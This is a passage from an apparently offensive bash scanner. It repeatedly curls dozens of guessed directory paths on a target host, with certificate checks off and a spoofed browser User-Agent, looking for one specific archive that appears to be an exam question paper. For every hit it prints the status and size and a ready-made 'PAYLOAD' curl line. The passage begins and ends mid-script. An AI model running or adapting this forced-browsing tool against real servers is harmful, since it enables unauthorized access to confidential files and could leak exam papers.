${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSyncQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSyncQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSyncQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaperDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaperDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaperDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemPlatform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemPlatform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile-Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile-Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload_ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload_ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
